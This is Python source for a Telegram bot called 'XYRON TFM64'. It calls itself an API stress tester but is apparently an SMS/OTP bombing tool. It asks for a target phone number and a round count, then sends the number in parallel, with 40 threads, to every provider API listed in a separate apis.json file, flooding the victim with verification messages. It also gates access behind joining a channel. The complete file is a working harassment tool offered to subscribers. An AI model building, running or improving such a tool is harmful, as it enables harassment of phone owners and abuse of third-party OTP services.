import os
import json
import time
import threading
import requests
import telebot
from telebot import types
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN   = os.environ.get("TELEGRAM_BOT_TOKEN", "")
ADMIN_ID    = 8373846582
CHANNEL     = "@rifatsbotz"
MAX_COUNT   = 11    # max rounds (1 round = all APIs fired once)
TIMEOUT_SEC = 10

# ─── STATE ────────────────────────────────────────────────────────────────────
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

global_status   = True   # True = operational
force_join      = True   # True = require channel membership

user_db: dict[int, dict] = {}   # {user_id: {joined_at, tests_run}}
user_state: dict[int, dict] = {}  # conversation state per user

db_lock = threading.Lock()

# ─── LOAD APIs ────────────────────────────────────────────────────────────────
def load_apis() -> list[dict]:
    api_file = os.path.join(os.path.dirname(__file__), "apis.json")
    with open(api_file, "r", encoding="utf-8") as f:
        data = json.load(f)
    return data.get("apis", [])

APIS = load_apis()

# ─── KEYBOARDS ────────────────────────────────────────────────────────────────
dashboard_config = {
    "text": "👋 *WELCOME TO 『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』*\n\n"
            "SUBSCRIBER ONLY 👊👽🤚\n\n"
            "Powered by 「 Prime Xyron 」👨‍💻\n\n"
            "⚡ Status: *Active*\n"
            "🛡️ System: *Secure & Fast*\n\n"
            "_নিচের বাটন ব্যবহার করে শুরু করুন_ 👇",
    
    "parse_mode": "Markdown",
    
    "reply_markup": {
        "keyboard": [
            [{"text": "👤 PROFILE", "style": "primary"}, {"text": "💥 START TEST", "style": "danger"}],
            [{"text": "⚙️ SETTINGS", "style": "success"}, {"text": "📢 CHANNEL", "style": "primary"}]
        ],
        "resize_keyboard": True
    }
}
def build_dashboard(config: dict) -> types.ReplyKeyboardMarkup:
    kb_data  = config["reply_markup"]
    rows     = kb_data["keyboard"]
    resize   = kb_data.get("resize_keyboard", True)
    markup   = types.ReplyKeyboardMarkup(resize_keyboard=resize, row_width=2)
    for row in rows:
        buttons = [types.KeyboardButton(btn["text"]) for btn in row]
        markup.row(*buttons)
    return markup

def build_join_inline(user_id: int) -> types.InlineKeyboardMarkup:
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL.lstrip('@')}"),
        types.InlineKeyboardButton("✅ Verify",        callback_data=f"verify_{user_id}")
    )
    return markup

def build_admin_panel() -> types.InlineKeyboardMarkup:
    markup = types.InlineKeyboardMarkup()
    status_label = "🟢 Global: ON"  if global_status else "🔴 Global: OFF"
    fj_label     = "🔒 ForceJoin: ON" if force_join   else "🔓 ForceJoin: OFF"
    markup.row(
        types.InlineKeyboardButton(status_label, callback_data="admin_toggle_status"),
        types.InlineKeyboardButton(fj_label,     callback_data="admin_toggle_fj")
    )
    markup.row(types.InlineKeyboardButton("📣 Broadcast", callback_data="admin_broadcast"))
    markup.row(types.InlineKeyboardButton("📊 Stats",     callback_data="admin_stats"))
    return markup

# ─── HELPERS ──────────────────────────────────────────────────────────────────
def register_user(user_id: int, username: str = "") -> None:
    with db_lock:
        if user_id not in user_db:
            user_db[user_id] = {
                "username":   username,
                "joined_at":  datetime.utcnow().isoformat(),
                "tests_run":  0
            }

def is_member(user_id: int) -> bool:
    try:
        member = bot.get_chat_member(CHANNEL, user_id)
        return member.status in ("member", "administrator", "creator")
    except Exception:
        return False

def check_access(message: types.Message) -> bool:
    uid = message.from_user.id
    if not global_status and uid != ADMIN_ID:
        bot.send_message(uid,
            "⚠️ 『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』 is currently offline.*\nPlease try again later.",
            parse_mode="Markdown")
        return False
    if force_join and uid != ADMIN_ID and not is_member(uid):
        bot.send_message(uid,
            "🚫 *Access Restricted*\n\n সাবস্ক্রাইব না করলে, ইউজ করতে দেব না 👊👽🤚",
            parse_mode="Markdown",
            reply_markup=build_join_inline(uid))
        return False
    return True

# ─── REQUEST ENGINE ───────────────────────────────────────────────────────────
def _do_request(api: dict, target: str) -> bool:
    url     = api.get("url", "").replace("*****", target)
    method  = api.get("method", "get").upper()
    headers = api.get("headers", {})
    raw_body = api.get("body", "")
    body    = raw_body.replace("*****", target) if raw_body else ""

    ct = headers.get("content-type", "")

    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=TIMEOUT_SEC)
        else:
            if "application/json" in ct:
                try:
                    payload = json.loads(body)
                    r = requests.post(url, headers=headers, json=payload, timeout=TIMEOUT_SEC)
                except (json.JSONDecodeError, TypeError):
                    r = requests.post(url, headers=headers, data=body, timeout=TIMEOUT_SEC)
            elif "x-www-form-urlencoded" in ct:
                r = requests.post(url, headers=headers, data=body, timeout=TIMEOUT_SEC)
            else:
                r = requests.post(url, headers=headers, data=body, timeout=TIMEOUT_SEC)
        return r.status_code < 500
    except Exception:
        return False

def run_stress_test(chat_id: int, target: str, rounds: int) -> None:
    """
    Fire ALL loaded APIs in parallel, repeated `rounds` times.
    1 round = every API called once.
    """
    if not APIS:
        bot.send_message(chat_id, "❌ No APIs loaded.")
        return

    total_apis  = len(APIS)
    total_tasks = total_apis * rounds
    total_sent  = 0
    total_ok    = 0
    start_time  = time.time()

    progress_msg = bot.send_message(chat_id,
        f"⚡ 「 Prime Xyron 」Request Stream Initiated*\n"
        f"Target: `{target}`\n"
        f"Rounds: `{rounds}`\n"
        f"APIs per round: `{total_apis}`\n"
        f"Total requests: `{total_tasks}`\n\n"
        f"⏳ Firing all providers…",
        parse_mode="Markdown")

    # Build full task list: every API repeated `rounds` times
    task_list = []
    for _ in range(rounds):
        for api in APIS:
            task_list.append(api)

    futures_map = {}
    with ThreadPoolExecutor(max_workers=40) as executor:
        for api in task_list:
            f = executor.submit(_do_request, api, target)
            futures_map[f] = api.get("name", "Unknown")

        update_every = max(1, total_tasks // 10)
        for future in as_completed(futures_map):
            total_sent += 1
            if future.result():
                total_ok += 1

            if total_sent % update_every == 0 or total_sent == total_tasks:
                try:
                    pct = int((total_sent / total_tasks) * 100)
                    bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
                    bot.edit_message_text(
                        f"⚡ Totally Request Stream*\n\n"
                        f"`[{bar}] {pct}%`\n\n"
                        f"📤 Sent:    `{total_sent}/{total_tasks}`\n"
                        f"✅ Success: `{total_ok}`\n"
                        f"❌ Failed:  `{total_sent - total_ok}`",
                        chat_id=chat_id,
                        message_id=progress_msg.message_id,
                        parse_mode="Markdown")
                except Exception:
                    pass

    elapsed = round(time.time() - start_time, 2)
    with db_lock:
        if chat_id in user_db:
            user_db[chat_id]["tests_run"] = user_db[chat_id].get("tests_run", 0) + 1

    report = {
        "status":         "Success" if total_ok > 0 else "Failed",
        "target":         "REDACTED",
        "rounds":         rounds,
        "apis_used":      total_apis,
        "total_sent":     total_sent,
        "success":        total_ok,
        "failed":         total_sent - total_ok,
        "elapsed_sec":    elapsed,
        "provider":       "「 Prime Xyron 」"
    }

    bot.send_message(chat_id,
        f"✅ *Stream Complete!*\n\n```json\n{json.dumps(report, indent=2)}\n```",
        parse_mode="Markdown",
        reply_markup=build_dashboard(dashboard_config))

# ─── HANDLERS ─────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
def cmd_start(message: types.Message) -> None:
    uid  = message.from_user.id
    name = message.from_user.first_name or "User"
    register_user(uid, message.from_user.username or "")

    if not check_access(message):
        return

    welcome = (
        f"🛡️ *Welcome to 『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』 , {name}!*\n\n"
        "The most powerful API Stress Testing system on Telegram.\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "「 Prime Xyron 」👨‍💻 | @rx_nahin_bot\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(uid, welcome,
        parse_mode="Markdown",
        reply_markup=build_dashboard(dashboard_config))

@bot.message_handler(commands=["admin"])
def cmd_admin(message: types.Message) -> None:
    if message.from_user.id != ADMIN_ID:
        return
    bot.send_message(ADMIN_ID,
        "🔧 *XYRON Master Control Panel*\n\nSelect an action below:",
        parse_mode="Markdown",
        reply_markup=build_admin_panel())

@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("verify_"))
def cb_verify(call: types.CallbackQuery) -> None:
    uid = call.from_user.id
    if is_member(uid):
        bot.answer_callback_query(call.id, "✅ Verified! Access granted.")
        register_user(uid, call.from_user.username or "")
        bot.send_message(uid,
            "✅ *Membership verified!*\n\nWelcome to XYRON.",
            parse_mode="Markdown",
            reply_markup=build_dashboard(dashboard_config))
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("admin_"))
def cb_admin(call: types.CallbackQuery) -> None:
    global global_status, force_join
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Unauthorized", show_alert=True)
        return

    action = call.data

    if action == "admin_toggle_status":
        global_status = not global_status
        label = "ENABLED ✅" if global_status else "DISABLED 🔴"
        bot.answer_callback_query(call.id, f"Global Status: {label}")
        bot.edit_message_reply_markup(call.message.chat.id,
                                      call.message.message_id,
                                      reply_markup=build_admin_panel())

    elif action == "admin_toggle_fj":
        force_join = not force_join
        label = "ENABLED 🔒" if force_join else "DISABLED 🔓"
        bot.answer_callback_query(call.id, f"Force Join: {label}")
        bot.edit_message_reply_markup(call.message.chat.id,
                                      call.message.message_id,
                                      reply_markup=build_admin_panel())

    elif action == "admin_broadcast":
        bot.answer_callback_query(call.id, "Send your broadcast message now.")
        with db_lock:
            uid_set = call.from_user.id
        user_state[uid_set] = {"step": "broadcast"}
        bot.send_message(ADMIN_ID, "📣 *Broadcast Mode*\n\nSend the message you want to broadcast:",
                         parse_mode="Markdown")

    elif action == "admin_stats":
        with db_lock:
            total_users = len(user_db)
            total_tests = sum(u.get("tests_run", 0) for u in user_db.values())
        bot.answer_callback_query(call.id)
        bot.send_message(ADMIN_ID,
            f"📊 *『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』*\n\n"
            f"👥 Total Users: `{total_users}`\n"
            f"🔥 Total Tests Run: `{total_tests}`\n"
            f"🌐 Global Status: `{'ON' if global_status else 'OFF'}`\n"
            f"🔒 Force Join: `{'ON' if force_join else 'OFF'}`",
            parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "👤 PROFILE")
def menu_profile(message: types.Message) -> None:
    if not check_access(message):
        return
    uid  = message.from_user.id
    name = message.from_user.first_name or "User"
    with db_lock:
        info = user_db.get(uid, {})
    tests = info.get("tests_run", 0)
    joined = info.get("joined_at", "Unknown")[:10]
    bot.send_message(uid,
        f"👤 *Your XYRON Profile*\n\n"
        f"🆔 ID: `{uid}`\n"
        f"📛 Name: `{name}`\n"
        f"📅 Since: `{joined}`\n"
        f"🔥 Tests Run: `{tests}`\n\n"
        f"『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "⚙️ SETTINGS")
def menu_settings(message: types.Message) -> None:
    if not check_access(message):
        return
    uid = message.from_user.id
    bot.send_message(uid,
        "⚙️ 『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』 Settings\n\n"
        f"• Max Requests per Session: `{MAX_COUNT}`\n"
        f"• Request Timeout: `{TIMEOUT_SEC}s`\n"
        f"• Loaded API Providers: `{len(APIS)}`\n"
        f"• Concurrency: `20 threads`\n\n"
        "_Settings are managed by the admin._",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "📢 CHANNEL")
def menu_channel(message: types.Message) -> None:
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📢 Join @rifatsbotz",
                                          url="https://t.me/rifatsbotz"))
    bot.send_message(uid,
        "📢 『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』Official Channel\n\nJoin for updates, announcements, and support.",
        parse_mode="Markdown",
        reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "💥 START TEST")
def menu_start_test(message: types.Message) -> None:
    if not check_access(message):
        return
    uid = message.from_user.id
    user_state[uid] = {"step": "await_target"}
    cancel_kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    cancel_kb.add(types.KeyboardButton("❌ Cancel"))
    bot.send_message(uid,
        "💥 『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』\n\n"
        f"📡 Loaded providers: `{len(APIS)}`\n\n"
        "📱 Enter the *target phone number*:\n"
        "_(e.g. `01XXXXXXXXX`)_",
        parse_mode="Markdown",
        reply_markup=cancel_kb)

@bot.message_handler(func=lambda m: True)
def handle_text(message: types.Message) -> None:
    uid  = message.from_user.id
    text = (message.text or "").strip()

    # Cancel
    if text == "❌ Cancel":
        user_state.pop(uid, None)
        bot.send_message(uid, "🔙 Cancelled. Back to dashboard.",
                         reply_markup=build_dashboard(dashboard_config))
        return

    state = user_state.get(uid, {})
    step  = state.get("step", "")

    # ── Admin broadcast message capture
    if step == "broadcast" and uid == ADMIN_ID:
        user_state.pop(uid, None)
        success, fail = 0, 0
        with db_lock:
            all_ids = list(user_db.keys())
        for target_uid in all_ids:
            try:
                bot.send_message(target_uid, text)
                success += 1
            except Exception:
                fail += 1
        bot.send_message(ADMIN_ID,
            f"📣 *Broadcast Complete*\n✅ Delivered: `{success}`\n❌ Failed: `{fail}`",
            parse_mode="Markdown",
            reply_markup=build_admin_panel())
        return

    # ── Step: awaiting target
    if step == "await_target":
        if not text:
            bot.send_message(uid, "⚠️ Please enter a valid target.")
            return
        user_state[uid] = {"step": "await_count", "target": text}
        bot.send_message(uid,
            f"🎯 Target set: `{text}`\n\n"
            f"🔁 Enter *number of rounds* (1–{MAX_COUNT}):\n"
            f"_1 round = all {len(APIS)} providers fire once_\n"
            f"_e.g. enter `3` → {len(APIS)*3} total requests_",
            parse_mode="Markdown")
        return

    # ── Step: awaiting round count
    if step == "await_count":
        target = state.get("target", "")
        try:
            rounds = int(text)
            if not (1 <= rounds <= MAX_COUNT):
                raise ValueError
        except ValueError:
            bot.send_message(uid, f"⚠️ Enter a number between 1 and {MAX_COUNT}.")
            return

        user_state.pop(uid, None)
        # Launch stress test in a background thread
        t = threading.Thread(target=run_stress_test, args=(uid, target, rounds), daemon=True)
        t.start()
        return

    # ── Default: show dashboard
    if not check_access(message):
        return
    bot.send_message(uid,
        "『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』DASHBOARD🎯\n\nChoose an option below:",
        parse_mode="Markdown",
        reply_markup=build_dashboard(dashboard_config))

# ─── MAIN ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("🛡️  XYRON V2 — Starting bot polling…")
    print(f"   Admin ID  : {ADMIN_ID}")
    print(f"   Channel   : {CHANNEL}")
    print(f"   APIs      : {len(APIS)}")
    print(f"   Max count : {MAX_COUNT}")
    bot.infinity_polling(timeout=30, long_polling_timeout=30)

